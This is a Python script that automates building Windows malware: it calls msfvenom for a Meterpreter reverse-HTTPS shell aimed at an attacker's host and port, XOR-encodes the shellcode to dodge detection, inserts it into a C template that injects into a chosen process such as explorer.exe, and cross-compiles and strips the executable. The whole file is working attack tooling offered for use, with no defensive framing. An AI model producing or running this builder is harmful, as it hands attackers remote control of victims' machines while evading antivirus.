#!/usr/bin/python

# This script requires msfvenom
import socket
import os
import random
import string
import sys

tmp_file_name = "msf-venom-sample.bin.tmp"

def gen_random_string(length):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def gen_msfvenom_sample(lhost: str, lport: str, payload: str, output_file: str):
    os.system(f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f raw  > {output_file}")
    return

def encode_msfvenom_sample(input_file:str, key:str, output_file:str):
    new_contents = bytearray()
    with open(input_file, "rb") as file:
        contents = list(file.read())
        key_bytes = list(key.encode())
        for i in range(len(contents)):
            new_contents.append(contents[i] ^ key_bytes[i % len(key_bytes)])
    tmp_contents = ""
    for byte in new_contents:
        tmp_contents += "\\x" + hex(byte)[2:]
    with open(output_file, "w") as file:
        file.write(tmp_contents)


def gen_create_helper(input_file:str,output_file:str, key:str, pid:int):
    tmp_frame_file = gen_random_string(8)
    if not output_file.endswith(".c"):
        output_file += ".c"
    os.system(f"cp frame.c {tmp_frame_file}")
    with open(input_file, "r") as file1:
        new_contents = ""
        with open(tmp_frame_file, "r") as file2:
            contents1 = file1.read()
            contents2 = file2.read()
            new_contents = contents2.replace("// PYTHON_REPLACE_ME_HERE_2", "char buf[] = \"" + contents1 + "\";")
            new_contents = new_contents.replace("// PYTHON_REPLACE_ME_HERE_1", gen_random_string(32))
            new_contents = new_contents.replace("// PYTHON_REPLACE_ME_HERE_3", "\"" + key + "\";")
            new_contents = new_contents.replace("// PYTHON_REPLACE_ME_HERE_4", str(pid) + ";")
            
        with open(tmp_frame_file, "w") as file3:
            file3.write(new_contents)
    os.system(f"mv {tmp_frame_file} {output_file}")
    return

def gen_compile_malware(input_file:str, output_file:str):
    if not input_file.endswith(".c"):
        input_file += ".c"
    os.system(f"x86_64-w64-mingw32-gcc {input_file} -o {output_file}.exe")
    os.system(f"strip {output_file}.exe")
    return

def print_welcome():
    print("Hello fellow hacker.")


def check_addr(addr: str):
    try:
        socket.inet_aton(addr)
        return True
    except socket.error:
        return False

def print_help():
    print("Required parameters:")
    print("--pid [int]\tThe PID the shellcode will get injected into on the host. You user must have the permissions to do this.")
    print("--out [filename]\tThe output file name for the source code. .exe will be appended when the script cross compiles the code.")
    print("--payload [string]\tThis is the msfvenom payload string to use. Recommended: windows/x64/meterpreter/reverse_https")
    print("--lhost [ip]\tThe public IP address of your attackers machine. Mind the firewall.")
    print("--lport [int]\tThe port on your attacking machine")
    return

if __name__ == "__main__":
    output_file = "payload.exe"
    payload = "windows/x64/meterpreter/reverse_https"
    pid_to_migrate = None
    lhost = None
    lport = None

    if len(sys.argv) == 1:
        tmp_file_name = "msf-venom-sample.bin"
        lhost = input("What is the LHOST: ")
        if not check_addr(lhost):
            print("Not valid ip address")
            exit(-1)
        lport = input("What is the LPORT: ")
        if not lport.isnumeric() and int(lport) >= 0 and int(lport) <= 65535:
            print("Not valid port number")
            exit(-2)
        payload = input("What is the msfvenom payload you want to use? ")
        if not payload.startswith("windows"):
            print("Only windows payloads are supported at this time.")
            print("Payload must start with windows/. Ex: windows/meterpreter/reverse_tcp")
            exit(-3)
        print("Warning: You must have access to the process to inject the shellcode.")
        pid_to_migrate = input("What PID do you want to inject into: (Tip: use explorer.exe's PID.) ")
        output_file = input("Enter output file name: ")
    if ("-h" in sys.argv or "--help" in sys.argv):
        print_help()
        exit()
    if "--pid" in sys.argv:
        pid_to_migrate = sys.argv[sys.argv.index("--pid") + 1]
    if "--out" in sys.argv:
        output_file = sys.argv[sys.argv.index("--out") + 1]
    if "--payload" in sys.argv:
        payload = sys.argv[sys.argv.index("--payload") + 1]
    if "--lhost" in sys.argv:
        lhost = sys.argv[sys.argv.index("--lhost") + 1]
    if "--lport" in sys.argv:
        lport = sys.argv[sys.argv.index("--lport") + 1]

    key = gen_random_string(16)
    gen_msfvenom_sample(lhost, lport, payload, tmp_file_name)
    encode_msfvenom_sample(tmp_file_name,key,tmp_file_name)
    gen_create_helper(tmp_file_name, output_file,key, pid_to_migrate)
    gen_compile_malware(output_file, output_file)
    os.system(f"rm {tmp_file_name}")
    

